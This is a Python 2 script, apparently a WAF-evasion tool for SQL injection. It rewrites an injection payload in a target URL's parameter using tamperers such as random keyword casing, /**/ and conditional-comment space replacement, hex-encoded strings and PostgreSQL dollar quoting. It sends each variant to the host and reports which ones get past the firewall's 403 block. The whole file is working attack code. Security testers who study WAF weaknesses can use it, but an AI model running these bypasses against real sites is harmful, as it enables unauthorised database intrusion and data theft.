#!/usr/bin/env python2
import httplib
import argparse
import urlparse
import random
import urllib
import urllib2
import copy
import re

def is_blocked(code):
    if code == 403:
        return True
    else:
        return False

def send_request(host, params, get="GET", display=False):
    url_parts = list(host)
    url_parts[4] = urllib.urlencode(params)
    url = urlparse.urlunparse(url_parts)
    req = urllib2.Request(url)
    req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0')
    try:
        res = urllib2.urlopen(req)
        code = res.code
    except urllib2.HTTPError, e:
        code = e.code

    if display:
        print "Request: %s" % (url)+"\t/\t",
        print "Response: %i" % code
    return is_blocked(code)

#============================== Tampering functions ===========================
# TODO: handle encoding tricks
class Tamperer(object):
    """Main tamperer class. All tamperers should implement this class"""
    def __init__(self):
        self.mysql = False
        self.postgresql = False
        pass

    def compatible(self, db):
        if db.lower() == "mysql":
            return self.mysql
        elif db.lower() == "postgresql":
            return self.postgresql
        else:
            return False


    def tamper(self, query):
        return query

class KeyWordRandomCase(Tamperer):
    """Replace SQL keywords with random lower/upper case (ex: table => TabLE)"""
    def __init__(self):
        self.mysql = True
        self.postgresql = True
        self.keywords= [
                "INFORMATION_SCHEMA", "INFORMATION_SCHEMA.TABLES", "INFORMATION_SCEMA.COLUMNS", "VERSION",
                "@@VERSION", "@@GLOBAL.VERSION", "USER()", "CURRENT_USER", "SYSTEM_USER", "SESSION_USER",
                "MYSQL.USER", "@@HOSTNAME", "UUID", "LOAD_FILE", "OUTFILE", "DUMPFILE", "BENCHMARK",
                "@@DATADIR", "GETPGUSERNAME", "PG_USER", "PG_DATABASE", "PG_READ_FILE", "FILE_STORE",
                "PG_SLEEP", "SLEEP", "SUBSTRING", "STRCMP", "ABSOLUTE", "ACTION", "ALLOCATE", "ALTER",
                "ASSERTION", "AUTHORIZATION", "BEGIN", "BETWEEN", "BIT_LENGTH", "BOTH", "CALL", "CASCADE",
                "CASCADED", "CASE", "CAST", "CATALOG", "CHAR", "CHAR_LENGTH", "CHARACTER", "CHARACTER_LENGTH",
                "CHECK", "CLOSE", "COALESCE", "COLLATE", "COLLATION", "COLUMN", "COMMIT", "CONDITION",
                "CONNECT", "CONNECTION", "CONSTRAINT", "CONSTRAINTS", "CONTAINS", "CONTINUE", "CONVERT",
                "CORRESPONDING", "COUNT", "CREATE", "CROSS", "CURRENT", "CURRENT_DATE", "CURRENT_PATH",
                "CURRENT_TIME", "CURRENT_TIMESTAMP", "CURRENT_USER", "CURSOR", "DATE", "DEALLOCATE",
                "DECIMAL", "DECLARE", "DEFAULT", "DEFERRABLE", "DEFERRED", "DELETE", "DESC", "DESCRIBE",
                "DESCRIPTOR", "DETERMINISTIC", "DIAGNOSTICS", "DISCONNECT", "DISTINCT", "DOMAIN", "DOUBLE",
                "DROP", "ELSE", "ELSEIF", "ESCAPE", "EXCEPT", "EXCEPTION", "EXEC", "EXECUTE", "EXISTS",
                "EXIT", "EXTERNAL", "EXTRACT", "FALSE", "FETCH", "FIRST", "FLOAT", "FOREIGN", "FOUND",
                "FROM", "FULL", "FUNCTION", "GLOBAL", "GOTO", "GRANT", "GROUP", "HANDLER", "HAVING",
                "HOUR", "IDENTITY", "IMMEDIATE", "INDICATOR", "INITIALLY", "INNER", "INOUT", "INPUT",
                "INSENSITIVE", "INSERT", "INTEGER", "INTERSECT", "INTERVAL", "INTO", "ISOLATION", "JOIN",
                "LANGUAGE", "LAST", "LEADING", "LEAVE", "LEFT", "LEVEL", "LIKE", "LOCAL", "LOOP", "LOWER",
                "MATCH", "MINUTE", "MODULE", "MONTH", "NAMES", "NATIONAL", "NATURAL", "NCHAR", "NEXT",
                "NULL", "NULLIF", "NUMERIC", "OCTET_LENGTH", "ONLY", "OPEN", "OPTION", "ORDER", "OUTER",
                "OUTPUT", "OVERLAPS", "PARAMETER", "PARTIAL", "PATH", "POSITION", "PRECISION", "PREPARE",
                "PRESERVE", "PRIMARY", "PRIOR", "PRIVILEGES", "PROCEDURE", "READ", "REAL", "REFERENCES",
                "RELATIVE", "REPEAT", "RESIGNAL", "RESTRICT", "RETURN", "RETURNS", "REVOKE", "RIGHT",
                "ROLLBACK", "ROUTINE", "ROWS", "SCHEMA", "SCROLL", "SECOND", "SECTION", "SELECT", "SESSION",
                "SESSION_USER", "SIGNAL", "SIZE", "SMALLINT", "SOME", "SPACE", "SPECIFIC", "SQLCODE",
                "SQLERROR", "SQLEXCEPTION", "SQLSTATE", "SQLWARNING", "SUBSTRING", "SYSTEM_USER", "TABLE_NAME",
                "TEMPORARY", "THEN", "TIME", "TIMESTAMP", "TIMEZONE_HOUR", "TIMEZONE_MINUTE", "TRAILING",
                "TRANSACTION", "TRANSLATE", "TRANSLATION", "TRIM", "TRUE", "UNDO", "UNION", "UNIQUE",
                "UNKNOWN", "UNTIL", "UPDATE", "UPPER", "USAGE", "USER", "USING", "VALUE", "VALUES", "VARCHAR",
                "VARYING", "VIEW", "WHEN", "WHENEVER", "WHERE", "WHILE", "WITH", "WORK", "WRITE", "YEAR",
                "ZONE", "ALTER", "ANALYZE", "ASASC", "ASENSITIVE", "BEFORE", "BETWEEN", "BIGINT", "BINARYBLOB",
                "BOTH", "CALL", "CASCADE", "CASECHANGE", "CAST", "CHAR", "CHARACTER", "CHECK", "COLLATE",
                "COLUMN", "CONCAT", "CONDITIONCONSTRAINT", "CONTINUE", "CONVERT", "CREATE", "CROSS",
                "CURRENT_DATE", "CURRENT_TIMECURRENT_TIMESTAMP", "CURRENT_USER", "CURSOR", "DATABASE",
                "DATABASES", "DAY_HOUR", "DAY_MICROSECONDDAY_MINUTE", "DAY_SECOND", "DECIMAL", "DECLARE",
                "DEFAULTDELAYED", "DELETE", "DESC", "DESCRIBE", "DETERMINISTIC", "DISTINCTDISTINCTROW",
                "DOUBLE", "DROP", "DUAL", "EACH", "ELSEELSEIF", "ENCLOSED", "ESCAPED", "EXISTS", "EXIT",
                "EXPLAIN", "FALSEFETCH", "FLOAT", "FLOAT4", "FLOAT8", "FORCE", "FOREIGNFROM", "FULLTEXT",
                "GRANT", "GROUP", "HAVING", "HIGH_PRIORITYHOUR_MICROSECOND", "HOUR_MINUTE", "HOUR_SECOND",
                "IFNULL", "IGNORE", "ININDEX", "INFILE", "INNER", "INOUT", "INSENSITIVE", "INSERT", "INTINT1",
                "INT2", "INT3", "INT4", "INT8", "INTEGER", "INTERVALINTO", "ISNULL", "ITERATE", "JOIN",
                "KEYS", "KILLLEADING", "LEAVE", "LEFT", "LIKE", "LIMIT", "LINESLOAD", "LOCALTIME",
                "LOCALTIMESTAMP", "LOCK", "LONG", "LONGBLOBLONGTEXT", "LOOP", "LOW_PRIORITY", "MATCH",
                "MEDIUMBLOB", "MEDIUMINT", "MEDIUMTEXTMIDDLEINT", "MINUTE_MICROSECOND", "MINUTE_SECOND",
                "MODIFIES", "NATURAL", "NOTNO_WRITE_TO_BINLOG", "NULL", "NUMERIC", "OPTIMIZE", "OPTION",
                "OPTIONALLYOR", "ORDER", "OUTER", "OUTFILE", "PRECISIONPRIMARY", "PROCEDURE", "PURGE", "READ",
                "READS", "REALREFERENCES", "REGEXP", "RELEASE", "RENAME", "REPEAT", "REPLACE",
                "REQUIRERESTRICT", "RETURN", "REVOKE", "RIGHT", "RLIKE", "SCHEMA", "SCHEMASSECOND_MICROSECOND",
                "SELECT", "SENSITIVE", "SEPARATOR", "SHOW", "SMALLINTSONAME", "SPATIAL", "SPECIFIC",
                "SQLEXCEPTION", "SQLSTATESQLWARNING", "SQL_BIG_RESULT", "SQL_CALC_FOUND_ROWS",
                "SQL_SMALL_RESULT", "STARTINGSTRAIGHT_JOIN", "TABLE", "TERMINATED", "THEN", "TINYBLOB",
                "TINYINT", "TINYTEXTTO", "TRAILING", "TRIGGER", "TRUE", "UNDO", "UNION", "UNIQUEUNLOCK",
                "UNSIGNED", "UPDATE", "USAGE", "USING", "UTC_DATEUTC_TIME", "UTC_TIMESTAMP", "VALUES",
                "VARBINARY", "VARCHAR", "VARCHARACTERVARYING", "VERSION", "WHEN", "WHERE", "WHILE",
                "WITH", "WRITEXOR", "YEAR_MONTH", "ZEROFILL",
                "PG_CLASS", "PG_CATALOG", "RELNAME", "PG_ATTRIBUTE", "ATTNAME", "ATTRELID",
                "CURRENT_SETTING", "DATA_DIRECTORY", "CURRENT_DATABASE"
                ]
        self.keywords.sort(lambda x,y: cmp(len(y), len(x)))
    def tamper(self, query):
        for kw in self.keywords:
            kwbeg = query.upper().find(kw)
            if kwbeg > -1:
                kw2 = "".join( random.choice([k.upper(), k ]) for k in kw.lower())
                query = query[:kwbeg] + kw2 + query[kwbeg+len(kw):]

        return query


class RemoveUselessSpace(Tamperer):
    """Remove useless space in the SQL injection query"""
    # Rules :
    # -space useless between of after a comma
    # -space useless before or after a ()
    # -multiple spaces
    def tamper(self, query):
        query = re.sub("\s*\,\s*", ",", query)
        query = re.sub("\s*\(\s*" , "(" , query)
        query = re.sub("\s+" , " " , query)
        return query

class ReplaceSpaceComment(Tamperer):
    """Replace space with Mysql comment /**/"""
    def __init__(self):
        super(ReplaceSpaceComment, self).__init__()
        self.mysql = True
        #FIXME:test with psql

    def tamper(self, query):
        query = re.sub("\s+" , "/**/" , query)
        return query

class ReplaceSpaceComment2(Tamperer):
    """Replace space char by a dash comment followed by a string and an end of line (--foobar%0A)"""
    def __init__(self):
        super(ReplaceSpaceComment2, self).__init__()
        self.mysql = True
    def tamper(self, query):
        return query.replace(' ', "--foorbar\n")

class ReplaceStringDollar(Tamperer):
    """Replace quoted string by $$string$$ (only psql > 6)"""
    def __init__(self):
        super(ReplaceStringDollar, self).__init__()
        self.postgresql = True
    def tamper(self, query):
        query = query.replace('"', '$$')
        query = query.replace("'", '$$')
        return query

class ReplaceStringHexValue(Tamperer):
    """Replace string with its hex value ('foobar' => 0x666F6F626172)"""
    # FIXME: do not work with postgresql
    def __init__(self):
        super(ReplaceStringHexValue, self).__init__()
        self.mysql = True
        self.functions = ["current_setting", "load_file"]
        self.postgresql = True
    def hexify(self, string):
        res = "0x"
        for c in string:
            res += "%X" % ord(c)
        return res
    def tamper(self, query):
        for i in self.functions:
            found = re.search("(?i)" + i + "\s*\(\s*'([^']*)'\s*\)",  query)
            if found:
                query = query.replace(found.group(1), self.hexify(found.group(1)))
            #query = re.sub("(?i)" + i + "\s*\(\s*'([^']*)'\s*\)", self.hexify, query)
        return query

class ReplaceSpaceWithTab(Tamperer):
    """Replace space with tab (%09)"""
    def __init__(self):
        super(ReplaceSpaceWithTab, self).__init__()
        self.mysql = True
        self.postgresql = True
    def tamper(self, query):
        query = query.replace(' ', "\t")
        return query

class KeywordWithConditionalComment(Tamperer):
    """Put keywords between conditional MySQL comments (/*!KEYWORD*/)"""
    def __init__(self):
        super(KeywordWithConditionalComment, self).__init__()
        self.mysql = True
        self.keywords = ["UNION", "SELECT"]
    def tamper(self, query):
        for kw in self.keywords:
            query = re.sub(r'(?i)\s*('+kw+')\s*', r'/*!\1*/', query)
        return query


# TODO
class ReplaceSpaceByparenthesis(Tamperer):
    """Replace spaces with parenthesis"""
    # Rules : Put first and last values after select between parenthesis
    # Put expression after UNION between parenthesis (it should detect the last comment if any)
    # Expression after from can be between ()
    def __init__(self):
        super(ReplaceSpaceByparenthesis, self).__init__()
        self.mysql = True
        self.postgresql = True

    def tamper(self, query):
        # FIXME: only works with several keywords
        # Remove extra space
        a = RemoveUselessSpace()
        tquery = a.tamper(query)
        # put sentence after form into parenthesis
        tquery = re.sub(r'(?i)from\s+([a-zA-Z0-9\._]+)\s*', r'FROM(\1)', tquery)
        # TODO
        return tquery


TAMPERERS = [
    "KeyWordRandomCase",
    "ReplaceSpaceComment",
    "ReplaceSpaceComment2",
    "KeywordWithConditionalComment",
    "ReplaceSpaceByparenthesis",
    "ReplaceStringDollar",
    "ReplaceStringHexValue",
    "ReplaceSpaceWithTab"
    ]
COMBINED_ACTIONS = [
        ["KeyWordRandomCase", "ReplaceSpaceByparenthesis"],
        ["KeyWordRandomCase", "ReplaceStringHexValue"],
        ["KeyWordRandomCase", "ReplaceSpaceByparenthesis", "ReplaceStringHexValue"],
    ]



#======================================= Main =================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Test many methods to bypass a WAF')
    parser.add_argument('-d', '--db', help='Type of database behind the WAF (mysql,pgsql)', type=str, choices=["mysql","postgresql"], default='mysql')
    parser.add_argument('-p', '--param', help='Parameter tampered (default is the first one)', default='')
    parser.add_argument('-v', '--verbose', help='verbose mode', action="count", default=0)
    parser.add_argument('-o', '--only-print', help='Only print the url tampered. Do not request any website', action="store_true")
    parser.add_argument('-t', '--tamper', help="use only on tampering script", type=str, choices=TAMPERERS, default='')
    parser.add_argument('-l', '--list', help="List tampering scripts", action='store_true')
    parser.add_argument('host', metavar='HOST',  help='Host targeted', nargs='?')

    args = parser.parse_args()

    if args.list:
        #only list the tampering methods
        print "Tampering methods:"
        for tm in TAMPERERS:
            print "\t-%s : %s" % (tm, eval(tm).__doc__)
        exit(0)
    else:
        if args.host == None:
            print "Host mandatory!"
            parser.print_help()
            exit(1)


    hh = args.host
    if not args.host.startswith("http"):
        host = urlparse.urlparse("http://" + hh)
    else:
        host = urlparse.urlparse(hh)
    params = urlparse.parse_qsl(host.query)
    param_keys = map(lambda x: x[0], params)

    # Identify main param
    if args.param == '':
        param = param_keys[0]
        param_id = 0
    else:
        if args.param in param_keys:
            param = args.param
            param_id = param_keys.index(param)
        else:
            print "Unknown param!"
            exit(1)

    # Test that the request is blocked
    if not args.only_print:
        if args.verbose > 1:
            print "Test",
        if not send_request(host, params, display=(args.verbose > 1)):
            print "This request is not blocked!!"
            exit(1)

    if args.tamper != '':
        ll = [args.tamper]
    else:
        ll = TAMPERERS

    found = False
    # Test tamperer list
    for tamperer in ll:
        t = eval(tamperer)()

        if t.compatible(args.db):
            # For each tamperer
            tquery = t.tamper(params[param_id][1])
            # Only if the tampering function changed something
            if tquery != params[param_id][1]:
                params2 = copy.copy(params)
                params2[param_id] = param, tquery
                if args.only_print:
                    print "%s : " % tamperer,
                    # Only print the query
                    url_parts = list(host)
                    # Manual join to avoid printin encoding
                    # FIXME : encode weird char (\n\t..)
                    url_parts[4] = '&'.join(map(lambda x: "%s=%s" % (x[0],x[1]), params2))
                    url = urlparse.urlunparse(url_parts)
                    print url
                else:
                    # Send request
                    if send_request(host, params2,display=(args.verbose > 2)):
                        if args.verbose > 1:
                            print "BLOCKED: %s" % tquery
                    else:
                        found = True
                        print "PASS: %s" % tquery

    # Combined tests
    for tamp_list in COMBINED_ACTIONS:
        # Validate the database
        tamp_listi = []
        compatible = True
        for tname in tamp_list:
            t = eval(tname)()
            tamp_listi.append(t)
            if not t.compatible(args.db):
                compatible = False

        if compatible:
            # tamper the query
            tquery = params[param_id][1]
            for t in tamp_listi:
                tquery = t.tamper(tquery)
            params2 = copy.copy(params)
            params2[param_id] = param, tquery
            if args.only_print:
                print "%s : " % tamp_list.__repr__(),
                # Only print the query
                url_parts = list(host)
                # Manual join to avoid print encoding request
                # FIXME : encode weird char (\n\t..)
                url_parts[4] = '&'.join(map(lambda x: "%s=%s" % (x[0],x[1]), params2))
                url = urlparse.urlunparse(url_parts)
                print url
            else:
                # Send request
                if send_request(host, params2,display=(args.verbose > 2)):
                    if args.verbose > 1:
                        print "BLOCKED: %s" % tquery
                else:
                    found = True
                    print "PASS: %s" % tquery


    if not found and not args.only_print:
        print "No bypass found!"



